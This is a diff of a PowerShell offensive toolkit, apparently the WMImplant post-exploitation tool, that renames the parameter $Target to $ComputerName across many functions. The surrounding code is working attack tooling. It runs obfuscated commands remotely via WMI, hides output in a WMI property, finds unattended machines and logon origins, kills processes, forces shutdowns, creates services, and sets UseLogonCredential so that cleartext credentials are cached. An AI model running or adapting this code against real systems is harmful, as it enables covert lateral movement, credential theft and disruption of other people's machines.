@@ -15,7 +15,7 @@ function Invoke-WMIObfuscatedPSCommand
         [Parameter(Mandatory = $True)]
         [String]$PSCommand,
         [Parameter(Mandatory = $True)]
-        [String]$Target,
+        [String]$ComputerName,
         [Parameter(Mandatory = $False)]
         [Switch]$ObfuscateWithEnvVar
     )
@@ -69,22 +69,22 @@ function Invoke-WMIObfuscatedPSCommand
         {
             if($Creds)
             {
-                $null = Set-WmiInstance -Class Win32_Environment -Argument @{Name=$VarName;VariableValue=$PSCommand;UserName=$Username} -ComputerName $Target -Credential $Creds
+                $null = Set-WmiInstance -Class Win32_Environment -Argument @{Name=$VarName;VariableValue=$PSCommand;UserName=$Username} -ComputerName $ComputerName -Credential $Creds
             }
             else
             {
-                $null = Set-WmiInstance -Class Win32_Environment -Argument @{Name=$VarName;VariableValue=$PSCommand;UserName=$Username} -ComputerName $Target
+                $null = Set-WmiInstance -Class Win32_Environment -Argument @{Name=$VarName;VariableValue=$PSCommand;UserName=$Username} -ComputerName $ComputerName
             }
         }
 
         # Launch PowerShell command.
         if($Creds)
         {
-            $null = Invoke-WmiMethod -Class Win32_Process -EnableAllPrivileges -Impersonation 3 -Authentication Packetprivacy -Name Create -Argumentlist $ObfuscatedCommand -Credential $Creds -ComputerName $Target
+            $null = Invoke-WmiMethod -Class Win32_Process -EnableAllPrivileges -Impersonation 3 -Authentication Packetprivacy -Name Create -Argumentlist $ObfuscatedCommand -Credential $Creds -ComputerName $ComputerName
         }
         else
         {
-            $null = Invoke-WmiMethod -Class Win32_Process -EnableAllPrivileges -Impersonation 3 -Authentication Packetprivacy -Name Create -Argumentlist $ObfuscatedCommand -ComputerName $Target
+            $null = Invoke-WmiMethod -Class Win32_Process -EnableAllPrivileges -Impersonation 3 -Authentication Packetprivacy -Name Create -Argumentlist $ObfuscatedCommand -ComputerName $ComputerName
         }
 
         # Delete environment variable containing PowerShell command if $ObfuscateWithEnvVar flag was defined.
@@ -92,11 +92,11 @@ function Invoke-WMIObfuscatedPSCommand
         {
             if($Creds)
             {
-                $null = Get-WmiObject -Query "SELECT * FROM Win32_Environment WHERE NAME='$VarName'" -ComputerName $Target -Credential $Creds | Remove-WmiObject
+                $null = Get-WmiObject -Query "SELECT * FROM Win32_Environment WHERE NAME='$VarName'" -ComputerName $ComputerName -Credential $Creds | Remove-WmiObject
             }
             else
             {
-                $null = Get-WmiObject -Query "SELECT * FROM Win32_Environment WHERE NAME='$VarName'" -ComputerName $Target | Remove-WmiObject
+                $null = Get-WmiObject -Query "SELECT * FROM Win32_Environment WHERE NAME='$VarName'" -ComputerName $ComputerName | Remove-WmiObject
             }
         }
 
@@ -127,26 +127,26 @@ function Find-CurrentUsers
         [Parameter(Mandatory = $False)]
         [System.Management.Automation.PSCredential]$Creds,
         [Parameter(Mandatory = $False)]
-        [string]$Target
+        [string]$ComputerName
     )
 
     Process
     {
-        if(!$Target)
+        if(!$ComputerName)
         {
-            $Target = Read-Host "What system are you targeting? >"
-            $Target = $Target.Trim()
+            $ComputerName = Read-Host "What system are you targeting? >"
+            $ComputerName = $ComputerName.Trim()
         }
 
-        Write-Verbose "Connecting to $Target"
+        Write-Verbose "Connecting to $ComputerName"
 
         if($Creds)
         {
-            $system_process_accounts = Get-WMIObject Win32_Process -Credential $Creds -ComputerName $Target | ForEach { $owner = $_.GetOwner(); '{0}\{1}' -f $owner.Domain, $owner.User } | Sort-Object | Get-Unique
+            $system_process_accounts = Get-WMIObject Win32_Process -Credential $Creds -ComputerName $ComputerName | ForEach { $owner = $_.GetOwner(); '{0}\{1}' -f $owner.Domain, $owner.User } | Sort-Object | Get-Unique
         }
         else
         {
-            $system_process_accounts = Get-WMIObject Win32_Process -ComputerName $Target | ForEach { $owner = $_.GetOwner(); '{0}\{1}' -f $owner.Domain, $owner.User } | Sort-Object | Get-Unique
+            $system_process_accounts = Get-WMIObject Win32_Process -ComputerName $ComputerName | ForEach { $owner = $_.GetOwner(); '{0}\{1}' -f $owner.Domain, $owner.User } | Sort-Object | Get-Unique
         }
 
         foreach($user_name in $system_process_accounts) 
@@ -170,28 +170,28 @@ function Find-VacantComputer
         [Parameter(Mandatory = $False)]
         [System.Management.Automation.PSCredential]$Creds,
         [Parameter(Mandatory = $False)]
-        [string]$Target
+        [string]$ComputerName
     )
 
     Process
     {
-        if(!$Target)
+        if(!$ComputerName)
         {
-            $Target = Read-Host "What system are you targeting? >"
-            $Target = $Target.Trim()
+            $ComputerName = Read-Host "What system are you targeting? >"
+            $ComputerName = $ComputerName.Trim()
         }
 
         # Need to add in filtering here to stop if a "true" has been found for screensavers being active
-        Write-Verbose "Connecting to $Target"
+        Write-Verbose "Connecting to $ComputerName"
         
         Write-Verbose "Checking for active screensaver or logon screen processes"
         if($Creds)
         {
-            $all_processes = Get-ProcessListingWMImplant -Creds $Creds -Target $Target
+            $all_processes = Get-ProcessListingWMImplant -Creds $Creds -ComputerName $ComputerName
         }
         else
         {
-            $all_processes = Get-ProcessListingWMImplant -Target $Target
+            $all_processes = Get-ProcessListingWMImplant -ComputerName $ComputerName
         }
 
         $ScreenshotActive = $all_processes | Select-String ".scr"
@@ -200,26 +200,26 @@ function Find-VacantComputer
         # If either returned true, we can assume the user is not active at their desktop
         if ($ScreenshotActive -or $LoginPrompt)
         {
-            Write-Output "Screensaver or Logon screen is active on $Target!"
+            Write-Output "Screensaver or Logon screen is active on $ComputerName!"
         }
         else
         {
-            Write-Output "User is at present at $Target!"
+            Write-Output "User is at present at $ComputerName!"
         }
 
         try
         {
             if($Creds)
             {
-                $user = Get-WmiObject -Class win32_computersystem -ComputerName $Target -Credential $Creds -ErrorAction Stop | select -ExpandProperty username
+                $user = Get-WmiObject -Class win32_computersystem -ComputerName $ComputerName -Credential $Creds -ErrorAction Stop | select -ExpandProperty username
             }
             else
             {
-                $user = Get-WmiObject -Class win32_computersystem -ComputerName $Target -ErrorAction Stop | select -ExpandProperty username
+                $user = Get-WmiObject -Class win32_computersystem -ComputerName $ComputerName -ErrorAction Stop | select -ExpandProperty username
             }
             if($user)
             {
-                Write-Output "$user has a session on $Target!"
+                Write-Output "$user has a session on $ComputerName!"
             }
         }
         catch
@@ -227,11 +227,11 @@ function Find-VacantComputer
             $message = $_.Exception.Message
             if($message -like '*not process argument because*')
             {
-                Write-Output "No users appear active on $Target"
+                Write-Output "No users appear active on $ComputerName"
             }
             elseif($message -like '*RPC server is unavailable*')
             {
-                Write-Verbose "Cannot connect to $Target"
+                Write-Verbose "Cannot connect to $ComputerName"
             }
         }
     }
@@ -247,27 +247,27 @@ function Get-ComputerDrives
         [Parameter(Mandatory = $False)]
         [System.Management.Automation.PSCredential]$Creds,
         [Parameter(Mandatory = $False)]
-        [string]$Target
+        [string]$ComputerName
     )
 
     Process
     {
-        if(!$Target)
+        if(!$ComputerName)
         {
-            $Target = Read-Host "What system are you targeting? >"
-            $Target = $Target.Trim()
+            $ComputerName = Read-Host "What system are you targeting? >"
+            $ComputerName = $ComputerName.Trim()
         }
 
         $filter = "DriveType = '4' OR DriveType = '3'"
 
         if($Creds)
         {
-            Get-WmiObject -class win32_logicaldisk -ComputerName $Target -Filter $filter -Credential $Creds
+            Get-WmiObject -class win32_logicaldisk -ComputerName $ComputerName -Filter $filter -Credential $Creds
         }
 
         else
         {
-            Get-WmiObject -class win32_logicaldisk -ComputerName $Target -Filter $filter
+            Get-WmiObject -class win32_logicaldisk -ComputerName $ComputerName -Filter $filter
         }
     }
     end{}
@@ -282,22 +282,22 @@ function Get-HostInfo
         [Parameter(Mandatory = $False)]
         [System.Management.Automation.PSCredential]$Creds,
         [Parameter(Mandatory = $False)]
-        [string]$Target
+        [string]$ComputerName
     )
 
     Process
     {
-        if(!$Target)
+        if(!$ComputerName)
         {
-            $Target = Read-Host "What system are you targeting? >"
-            $Target = $Target.Trim()
+            $ComputerName = Read-Host "What system are you targeting? >"
+            $ComputerName = $ComputerName.Trim()
         }
 
         if($Creds)
         {
             try
             {
-                $sys_info = Get-WmiObject -class win32_computersystem -ComputerName $Target -Credential $Creds -ErrorAction Stop
+                $sys_info = Get-WmiObject -class win32_computersystem -ComputerName $ComputerName -Credential $Creds -ErrorAction Stop
             }
             catch
             {
@@ -309,7 +309,7 @@ function Get-HostInfo
         {
             try
             {
-                $sys_info = Get-WmiObject -class win32_computersystem -ComputerName $Target -ErrorAction Stop
+                $sys_info = Get-WmiObject -class win32_computersystem -ComputerName $ComputerName -ErrorAction Stop
             }
             catch
             {
@@ -334,26 +334,26 @@ function Get-InstalledPrograms
         [Parameter(Mandatory = $False)]
         [System.Management.Automation.PSCredential]$Creds,
         [Parameter(Mandatory = $False)]
-        [string]$Target
+        [string]$ComputerName
     )
 
     Process
     {
 
-        if(!$Target)
+        if(!$ComputerName)
         {
-            $Target = Read-Host "What system are you targeting? >"
-            $Target = $Target.Trim()
+            $ComputerName = Read-Host "What system are you targeting? >"
+            $ComputerName = $ComputerName.Trim()
         }
 
         # Store data in existing WMI property, but keep original value
         if($Creds)
         {
-            $Original_WMIProperty = (Get-WmiObject -Class Win32_OSRecoveryConfiguration -ComputerName $Target -Credential $Creds).DebugFilePath
+            $Original_WMIProperty = (Get-WmiObject -Class Win32_OSRecoveryConfiguration -ComputerName $ComputerName -Credential $Creds).DebugFilePath
         }
         else
         {
-            $Original_WMIProperty = (Get-WmiObject -Class Win32_OSRecoveryConfiguration -ComputerName $Target).DebugFilePath
+            $Original_WMIProperty = (Get-WmiObject -Class Win32_OSRecoveryConfiguration -ComputerName $ComputerName).DebugFilePath
         }
 
         Write-Verbose "Running remote command and writing to WMI property"
@@ -361,11 +361,11 @@ function Get-InstalledPrograms
 
         if($Creds)
         {
-            Invoke-WMIObfuscatedPSCommand -PSCommand $remote_command -Target $Target -Creds $creds -ObfuscateWithEnvVar
+            Invoke-WMIObfuscatedPSCommand -PSCommand $remote_command -ComputerName $ComputerName -Creds $creds -ObfuscateWithEnvVar
         }
         else
         {
-            Invoke-WMIObfuscatedPSCommand -PSCommand $remote_command -Target $Target -ObfuscateWithEnvVar
+            Invoke-WMIObfuscatedPSCommand -PSCommand $remote_command -ComputerName $ComputerName -ObfuscateWithEnvVar
         }
 
         # Poll remote system, and determine if the script is done
@@ -376,11 +376,11 @@ function Get-InstalledPrograms
             Write-Verbose "Polling property to see if the script has completed"
             if($Creds)
             {
-                $modified_WMIObject = Get-WMIObject -Class Win32_OSRecoveryConfiguration -ComputerName $Target -Credential $Creds
+                $modified_WMIObject = Get-WMIObject -Class Win32_OSRecoveryConfiguration -ComputerName $ComputerName -Credential $Creds
             }
             else
             {
-                $modified_WMIObject = Get-WMIObject -Class Win32_OSRecoveryConfiguration -ComputerName $Target
+                $modified_WMIObject = Get-WMIObject -Class Win32_OSRecoveryConfiguration -ComputerName $ComputerName
             }
             
             try 
@@ -429,24 +429,24 @@ function Get-NetworkCards
         [Parameter(Mandatory = $False)]
         [System.Management.Automation.PSCredential]$Creds,
         [Parameter(Mandatory = $False)]
-        [string]$Target
+        [string]$ComputerName
     )
 
     Process
     {
-        if(!$Target)
+        if(!$ComputerName)
         {
-            $Target = Read-Host "What system are you targeting? >"
-            $Target = $Target.Trim()
+            $ComputerName = Read-Host "What system are you targeting? >"
+            $ComputerName = $ComputerName.Trim()
         }
 
         if($Creds)
         {
-            $adapters = Get-WmiObject -class win32_networkadapterconfiguration -ComputerName $Target -Credential $Creds
+            $adapters = Get-WmiObject -class win32_networkadapterconfiguration -ComputerName $ComputerName -Credential $Creds
         }
         else
         {
-            $adapters = Get-WmiObject -class win32_networkadapterconfiguration -ComputerName $Target
+            $adapters = Get-WmiObject -class win32_networkadapterconfiguration -ComputerName $ComputerName
         }
 
         foreach($nic in $adapters)
@@ -469,26 +469,26 @@ function Get-ProcessListingWMImplant
         [Parameter(Mandatory = $False)]
         [System.Management.Automation.PSCredential]$Creds,
         [Parameter(Mandatory = $False)] 
-        [string]$Target
+        [string]$ComputerName
     )
 
     Process
     {
-        if(!$Target)
+        if(!$ComputerName)
         {
-            $Target = Read-Host "What system are you targeting? >"
-            $Target = $Target.Trim()
+            $ComputerName = Read-Host "What system are you targeting? >"
+            $ComputerName = $ComputerName.Trim()
         }
 
-        Write-Verbose "Connecting to $Target"
+        Write-Verbose "Connecting to $ComputerName"
 
         if($Creds)
         {
-            Get-WMIObject Win32_Process -Credential $Creds -ComputerName $Target | ForEach-Object { $_.ProcessName } | Sort-Object | Get-Unique
+            Get-WMIObject Win32_Process -Credential $Creds -ComputerName $ComputerName | ForEach-Object { $_.ProcessName } | Sort-Object | Get-Unique
         }
         else
         {
-            Get-WMIObject Win32_Process -ComputerName $Target | ForEach-Object { $_.ProcessName } | Sort-Object | Get-Unique
+            Get-WMIObject Win32_Process -ComputerName $ComputerName | ForEach-Object { $_.ProcessName } | Sort-Object | Get-Unique
         }
     }
 }
@@ -501,7 +501,7 @@ Will get remote login details from event log on remote hosts.
 This can be used to find out where people are logging in from or
 to find jump boxes.
 
-.PARAMETER Targets
+.PARAMETER ComputerName
 List of targets. Will accept value from pipe.
 
 .PARAMETER User
@@ -520,29 +520,29 @@ Path to save output to
         [Parameter(Mandatory = $False)]
         [System.Management.Automation.PSCredential]$Creds,
         [Parameter(Mandatory = $False)]
-        [string]$Target,
+        [string]$ComputerName,
         [Parameter(Mandatory = $False)]
         [string]$FileName
     )
 
     Process {
 
-        if(!$Target)
+        if(!$ComputerName)
         {
-            $Target = Read-Host "What system are you targeting? >"
-            $Target = $Target.Trim()
+            $ComputerName = Read-Host "What system are you targeting? >"
+            $ComputerName = $ComputerName.Trim()
         }
 
-        Write-Verbose "Connecting to $Target"
+        Write-Verbose "Connecting to $ComputerName"
 
         if($Creds)
         {
-            $results = Get-WmiObject -Credential $Creds -computername $Target -query "SELECT * FROM Win32_NTLogEvent WHERE (logfile='security') AND (EventCode='4624')" | where { $_.Message | Select-String "Logon Type:\s+(2|10)" | Select-String "Logon Process:\s+User32"}
+            $results = Get-WmiObject -Credential $Creds -computername $ComputerName -query "SELECT * FROM Win32_NTLogEvent WHERE (logfile='security') AND (EventCode='4624')" | where { $_.Message | Select-String "Logon Type:\s+(2|10)" | Select-String "Logon Process:\s+User32"}
         }
 
         else
         {
-            $results = Get-WmiObject -computername $Target -query "SELECT * FROM Win32_NTLogEvent WHERE (logfile='security') AND (EventCode='4624')" | where { $_.Message | Select-String "Logon Type:\s+(2|10)" | Select-String "Logon Process:\s+User32"}
+            $results = Get-WmiObject -computername $ComputerName -query "SELECT * FROM Win32_NTLogEvent WHERE (logfile='security') AND (EventCode='4624')" | where { $_.Message | Select-String "Logon Type:\s+(2|10)" | Select-String "Logon Process:\s+User32"}
         }
 
         $temp2 = @()
@@ -581,17 +581,17 @@ function Invoke-CommandExecution
         [Parameter(Mandatory = $False)]
         [System.Management.Automation.PSCredential]$Creds,
         [Parameter(Mandatory = $False)]
-        [string]$Target,
+        [string]$ComputerName,
         [Parameter(Mandatory = $False)]
         [string]$ExecCommand
     )
 
     Process
     {
-        if(!$Target)
+        if(!$ComputerName)
         {
-            $Target = Read-Host "What system are you targeting? >"
-            $Target = $Target.Trim()
+            $ComputerName = Read-Host "What system are you targeting? >"
+            $ComputerName = $ComputerName.Trim()
         }
 
         if(!$ExecCommand)
@@ -602,11 +602,11 @@ function Invoke-CommandExecution
         # Get original WMI Property
         if($Creds)
         {
-            $Original_WMIProperty = (Get-WmiObject -Class Win32_OSRecoveryConfiguration -ComputerName $Target -Credential $Creds).DebugFilePath
+            $Original_WMIProperty = (Get-WmiObject -Class Win32_OSRecoveryConfiguration -ComputerName $ComputerName -Credential $Creds).DebugFilePath
         }
         else
         {
-            $Original_WMIProperty = (Get-WmiObject -Class Win32_OSRecoveryConfiguration -ComputerName $Target).DebugFilePath
+            $Original_WMIProperty = (Get-WmiObject -Class Win32_OSRecoveryConfiguration -ComputerName $ComputerName).DebugFilePath
         }
 
         Write-Verbose "Building PowerShell command"
@@ -620,11 +620,11 @@ function Invoke-CommandExecution
 
         if($Creds)
         {
-            Invoke-WMIObfuscatedPSCommand -PSCommand $remote_command -Target $Target -Creds $creds -ObfuscateWithEnvVar
+            Invoke-WMIObfuscatedPSCommand -PSCommand $remote_command -ComputerName $ComputerName -Creds $creds -ObfuscateWithEnvVar
         }
         else
         {
-            Invoke-WMIObfuscatedPSCommand -PSCommand $remote_command -Target $Target -ObfuscateWithEnvVar
+            Invoke-WMIObfuscatedPSCommand -PSCommand $remote_command -ComputerName $ComputerName -ObfuscateWithEnvVar
         }
 
         # Poll remote system, and determine if the script is done
@@ -635,11 +635,11 @@ function Invoke-CommandExecution
             Write-Verbose "Polling property to see if the script has completed"
             if($Creds)
             {
-                $modified_WMIObject = Get-WMIObject -Class Win32_OSRecoveryConfiguration -ComputerName $Target -Credential $Creds
+                $modified_WMIObject = Get-WMIObject -Class Win32_OSRecoveryConfiguration -ComputerName $ComputerName -Credential $Creds
             }
             else
             {
-                $modified_WMIObject = Get-WMIObject -Class Win32_OSRecoveryConfiguration -ComputerName $Target
+                $modified_WMIObject = Get-WMIObject -Class Win32_OSRecoveryConfiguration -ComputerName $ComputerName
             }
             
             try 
@@ -1004,7 +1004,7 @@ function Invoke-CommandGeneration
 
     if($Command -ne '')
     {
-        $Command += " -Target $GenTarget"
+        $Command += " -ComputerName $GenTarget"
         if(($AnyCreds -eq "yes") -or ($AnyCreds -eq "y"))
         {
             $Command += " -RemoteUser $GenUsername -RemotePass $GenPassword`n"
@@ -1024,7 +1024,7 @@ function Invoke-ProcessPunisher
         [Parameter(Mandatory = $False)]
         [System.Management.Automation.PSCredential]$Creds,
         [Parameter(Mandatory = $False)]
-        [string]$Target,
+        [string]$ComputerName,
         [Parameter(Mandatory = $False)] 
         [string]$PName,
         [Parameter(Mandatory = $False)] 
@@ -1033,10 +1033,10 @@ function Invoke-ProcessPunisher
 
     Process
     {
-        if(!$Target)
+        if(!$ComputerName)
         {
-            $Target = Read-Host "What system are you targeting? >"
-            $Target = $Target.Trim()
+            $ComputerName = Read-Host "What system are you targeting? >"
+            $ComputerName = $ComputerName.Trim()
         }
 
         if(!$PName -and !$ProcId)
@@ -1066,11 +1066,11 @@ function Invoke-ProcessPunisher
 
             if($Creds)
             {
-                Get-WmiObject -Class win32_Process -Credential $Creds -Computername $Target -Filter "name = '$PName'" | ForEach-Object { $_.Terminate() }
+                Get-WmiObject -Class win32_Process -Credential $Creds -Computername $ComputerName -Filter "name = '$PName'" | ForEach-Object { $_.Terminate() }
             }
             else
             {
-                Get-WmiObject -Class win32_Process -Computername $Target -Filter "name = '$PName'" | ForEach-Object { $_.Terminate() }
+                Get-WmiObject -Class win32_Process -Computername $ComputerName -Filter "name = '$PName'" | ForEach-Object { $_.Terminate() }
             }
         }
 
@@ -1080,11 +1080,11 @@ function Invoke-ProcessPunisher
 
             if($Creds)
             {
-                Get-WmiObject -Class win32_Process -Credential $Creds -Computername $Target -Filter "ProcessID = '$ProcId'" | ForEach-Object { $_.Terminate() }
+                Get-WmiObject -Class win32_Process -Credential $Creds -Computername $ComputerName -Filter "ProcessID = '$ProcId'" | ForEach-Object { $_.Terminate() }
             }
             else
             {
-                Get-WmiObject -Class win32_Process -Computername $Target -Filter "ProcessID = '$ProcId'" | ForEach-Object { $_.Terminate() }
+                Get-WmiObject -Class win32_Process -Computername $ComputerName -Filter "ProcessID = '$ProcId'" | ForEach-Object { $_.Terminate() }
             }
         }
     }
@@ -1100,7 +1100,7 @@ function Invoke-PowerOptionsWMI
         [Parameter(Mandatory = $False)]
         [System.Management.Automation.PSCredential]$Creds,
         [Parameter(Mandatory = $False)]
-        [string]$Target,
+        [string]$ComputerName,
         [Parameter(Mandatory = $False, ParameterSetName='shutdown')] 
         [switch]$Shutdown,
         [Parameter(Mandatory = $False, ParameterSetName='reboot')] 
@@ -1111,10 +1111,10 @@ function Invoke-PowerOptionsWMI
 
     Process
     {
-        if(!$Target)
+        if(!$ComputerName)
         {
-            $Target = Read-Host "What system are you targeting? >"
-            $Target = $Target.Trim()
+            $ComputerName = Read-Host "What system are you targeting? >"
+            $ComputerName = $ComputerName.Trim()
         }
 
         if(!$Shutdown -and !$Reboot -and !$Logoff)
@@ -1154,15 +1154,15 @@ function Invoke-PowerOptionsWMI
             $power_option = 4
         }
 
-        Write-Verbose "Connecting to $Target"
+        Write-Verbose "Connecting to $ComputerName"
 
         if($Creds)
         {
-            (gwmi win32_operatingsystem -Credential $Creds -ComputerName $Target).Win32Shutdown($power_option)
+            (gwmi win32_operatingsystem -Credential $Creds -ComputerName $ComputerName).Win32Shutdown($power_option)
         }
         else
         {
-            (gwmi win32_operatingsystem -ComputerName $Target).Win32Shutdown($power_option)
+            (gwmi win32_operatingsystem -ComputerName $ComputerName).Win32Shutdown($power_option)
         }
     }
     end{}
@@ -1178,17 +1178,17 @@ function Invoke-ProcSpawn
         [Parameter(Mandatory = $False)]
         [System.Management.Automation.PSCredential]$Creds,
         [Parameter(Mandatory = $False)]
-        [string]$Target,
+        [string]$ComputerName,
         [Parameter(Mandatory = $False)] 
         [string]$Command
     )
 
     Process
     {
-        if(!$Target)
+        if(!$ComputerName)
         {
-            $Target = Read-Host "What system are you targeting? >"
-            $Target = $Target.Trim()
+            $ComputerName = Read-Host "What system are you targeting? >"
+            $ComputerName = $ComputerName.Trim()
         }
 
         if(!$Command)
@@ -1199,12 +1199,12 @@ function Invoke-ProcSpawn
 
         if($Creds)
         {
-            Invoke-WmiMethod -class win32_process -name create -Argumentlist $Command -Credential $Creds -Computername $Target
+            Invoke-WmiMethod -class win32_process -name create -Argumentlist $Command -Credential $Creds -Computername $ComputerName
         }
 
         else
         {
-            Invoke-WmiMethod -class win32_process -name create -Argumentlist $Command -Computername $Target
+            Invoke-WmiMethod -class win32_process -name create -Argumentlist $Command -Computername $ComputerName
         }
     }
 
@@ -1221,7 +1221,7 @@ function Invoke-RegValueMod
         [Parameter(Mandatory = $False)]
         [System.Management.Automation.PSCredential]$Creds,
         [Parameter(Mandatory = $False)]
-        [string]$Target,
+        [string]$ComputerName,
         [Parameter(Mandatory = $False)] 
         [switch]$KeyCreate,
         [Parameter(Mandatory = $False)] 
@@ -1244,10 +1244,10 @@ function Invoke-RegValueMod
         $hkusers = 2147483651
         $hkcurrentconfig = 2147483653
 
-        if(!$Target)
+        if(!$ComputerName)
         {
-            $Target = Read-Host "What system are you targeting? >"
-            $Target = $Target.Trim()
+            $ComputerName = Read-Host "What system are you targeting? >"
+            $ComputerName = $ComputerName.Trim()
         }
 
         if(!$RegHive)
@@ -1360,11 +1360,11 @@ function Invoke-RegValueMod
             {
                 if($RegSubKey -eq "UseLogonCredential" -or $RegSubKey -eq "AllowAutoConfig") 
                 {
-                    Invoke-WmiMethod -Class StdRegProv -Name SetDWORDValue -ArgumentList @($hivevalue, $RegKey, $RegSubKey, 1) -ComputerName $Target -Credential $Creds
+                    Invoke-WmiMethod -Class StdRegProv -Name SetDWORDValue -ArgumentList @($hivevalue, $RegKey, $RegSubKey, 1) -ComputerName $ComputerName -Credential $Creds
                 }
                 else
                 {
-                    Invoke-WmiMethod -Class StdRegProv -Name SetStringValue -ArgmuentList $hivevalue, $RegKey, $RegValue, $RegSubKey -ComputerName $Target -Credential $Creds
+                    Invoke-WmiMethod -Class StdRegProv -Name SetStringValue -ArgmuentList $hivevalue, $RegKey, $RegValue, $RegSubKey -ComputerName $ComputerName -Credential $Creds
                 }
             }
 
@@ -1372,11 +1372,11 @@ function Invoke-RegValueMod
             {
                 if($RegSubKey -eq "UseLogonCredential" -or $RegSubKey -eq "AllowAutoConfig")
                 {
-                    Invoke-WmiMethod -Class StdRegProv -Name SetDWORDValue -ArgumentList @($hivevalue, $RegKey, $RegSubKey, 1) -ComputerName $Target
+                    Invoke-WmiMethod -Class StdRegProv -Name SetDWORDValue -ArgumentList @($hivevalue, $RegKey, $RegSubKey, 1) -ComputerName $ComputerName
                 }
                 else
                 {
-                    Invoke-WmiMethod -Class StdRegProv -Name SetStringValue -ArgumentList $hivevalue, $RegKey, $RegValue, $RegSubKey -ComputerName $Target
+                    Invoke-WmiMethod -Class StdRegProv -Name SetStringValue -ArgumentList $hivevalue, $RegKey, $RegValue, $RegSubKey -ComputerName $ComputerName
                 }
             }
         }
@@ -1385,12 +1385,12 @@ function Invoke-RegValueMod
         {
             if($Creds)
             {
-                Invoke-WmiMethod -Class StdRegProv -Name DeleteValue -ArgumentList $hivevalue, $RegKey, $RegSubKey -ComputerName $Target -Credential $Creds
+                Invoke-WmiMethod -Class StdRegProv -Name DeleteValue -ArgumentList $hivevalue, $RegKey, $RegSubKey -ComputerName $ComputerName -Credential $Creds
             }
 
             else
             {
-                Invoke-WmiMethod -Class StdRegProv -Name DeleteValue -ArgumentList $hivevalue, $RegKey, $RegSubKey -ComputerName $Target
+                Invoke-WmiMethod -Class StdRegProv -Name DeleteValue -ArgumentList $hivevalue, $RegKey, $RegSubKey -ComputerName $ComputerName
             }
         }
     }
@@ -1406,7 +1406,7 @@ function Invoke-RemoteScriptWithOutput
         [Parameter(Mandatory = $False)]
         [System.Management.Automation.PSCredential]$Creds,
         [Parameter(Mandatory = $False)]
-        [string]$Target,
+        [string]$ComputerName,
         [Parameter(Mandatory = $False)] 
         [string]$Location,
         [Parameter(Mandatory = $False)] 
@@ -1415,10 +1415,10 @@ function Invoke-RemoteScriptWithOutput
 
     Process
     {
-        if(!$Target)
+        if(!$ComputerName)
         {
-            $Target = Read-Host "What system are you targeting? >"
-            $Target = $Target.Trim()
+            $ComputerName = Read-Host "What system are you targeting? >"
+            $ComputerName = $ComputerName.Trim()
         }
 
         if(!$Location)
@@ -1436,11 +1436,11 @@ function Invoke-RemoteScriptWithOutput
         # Saving original WMI Property value
         if($Creds)
         {
-            $Original_WMIProperty = (Get-WmiObject -Class Win32_OSRecoveryConfiguration -ComputerName $Target -Credential $Creds).DebugFilePath
+            $Original_WMIProperty = (Get-WmiObject -Class Win32_OSRecoveryConfiguration -ComputerName $ComputerName -Credential $Creds).DebugFilePath
         }
         else
         {
-            $Original_WMIProperty = (Get-WmiObject -Class Win32_OSRecoveryConfiguration -ComputerName $Target).DebugFilePath
+            $Original_WMIProperty = (Get-WmiObject -Class Win32_OSRecoveryConfiguration -ComputerName $ComputerName).DebugFilePath
         }
 
         # Read in and store the script to run
@@ -1449,11 +1449,11 @@ function Invoke-RemoteScriptWithOutput
 
         if($Creds)
         {
-            $modify_wmi_prop = Get-WmiObject -Class Win32_OSRecoveryConfiguration -ComputerName $Target -Credential $Creds
+            $modify_wmi_prop = Get-WmiObject -Class Win32_OSRecoveryConfiguration -ComputerName $ComputerName -Credential $Creds
         }
         else
         {
-            $modify_wmi_prop = Get-WmiObject -Class Win32_OSRecoveryConfiguration -ComputerName $Target
+            $modify_wmi_prop = Get-WmiObject -Class Win32_OSRecoveryConfiguration -ComputerName $ComputerName
         }
         $modify_wmi_prop.DebugFilePath = $encoded_script
         $null = $modify_wmi_prop.Put()
@@ -1470,11 +1470,11 @@ function Invoke-RemoteScriptWithOutput
 
         if($Creds)
         {
-            Invoke-WMIObfuscatedPSCommand -PSCommand $remote_command -Target $Target -Creds $Creds -ObfuscateWithEnvVar
+            Invoke-WMIObfuscatedPSCommand -PSCommand $remote_command -ComputerName $ComputerName -Creds $Creds -ObfuscateWithEnvVar
         }
         else
         {
-            Invoke-WMIObfuscatedPSCommand -PSCommand $remote_command -Target $Target -ObfuscateWithEnvVar
+            Invoke-WMIObfuscatedPSCommand -PSCommand $remote_command -ComputerName $ComputerName -ObfuscateWithEnvVar
         }
 
         # Poll remote system, and determine if the script is done
@@ -1485,11 +1485,11 @@ function Invoke-RemoteScriptWithOutput
             Write-Verbose "Polling property to see if the script has completed"
             if($Creds)
             {
-                $modified_WMIObject = Get-WMIObject -Class Win32_OSRecoveryConfiguration -ComputerName $Target -Credential $Creds
+                $modified_WMIObject = Get-WMIObject -Class Win32_OSRecoveryConfiguration -ComputerName $ComputerName -Credential $Creds
             }
             else
             {
-                $modified_WMIObject = Get-WMIObject -Class Win32_OSRecoveryConfiguration -ComputerName $Target
+                $modified_WMIObject = Get-WMIObject -Class Win32_OSRecoveryConfiguration -ComputerName $ComputerName
             }
             
             try 
@@ -1533,7 +1533,7 @@ function Invoke-ServiceMod
         [Parameter(Mandatory = $False)]
         [System.Management.Automation.PSCredential]$Creds,
         [Parameter(Mandatory = $False)]
-        [string]$Target,
+        [string]$ComputerName,
         [Parameter(Mandatory = $False)]
         [string]$Service,
         [Parameter(Mandatory = $False)] 
@@ -1552,10 +1552,10 @@ function Invoke-ServiceMod
 
     Process
     {   
-        if(!$Target)
+        if(!$ComputerName)
         {
-            $Target = Read-Host "What system are you targeting? >"
-            $Target = $Target.Trim()
+            $ComputerName = Read-Host "What system are you targeting? >"
+            $ComputerName = $ComputerName.Trim()
         }
 
         if(!$Start -and !$Stop -and !$Delete -and !$Create)
@@ -1599,11 +1599,11 @@ function Invoke-ServiceMod
 
             if($Creds)
             {
-                $SystemService = Get-WmiObject -class win32_service -ComputerName $Target -Filter $filter -Credential $Creds
+                $SystemService = Get-WmiObject -class win32_service -ComputerName $ComputerName -Filter $filter -Credential $Creds
             }
             else
             {
-                $SystemService = Get-WmiObject -class win32_service -ComputerName $Target -Filter $filter
+                $SystemService = Get-WmiObject -class win32_service -ComputerName $ComputerName -Filter $filter
             }
             if($Start)
             {
@@ -1636,11 +1636,11 @@ function Invoke-ServiceMod
             
             if($Creds)
             {
-                Invoke-WmiMethod -path Win32_Service -Name create -argumentlist $args -ComputerName $Target -Credential $Creds
+                Invoke-WmiMethod -path Win32_Service -Name create -argumentlist $args -ComputerName $ComputerName -Credential $Creds
             }
             else
             {
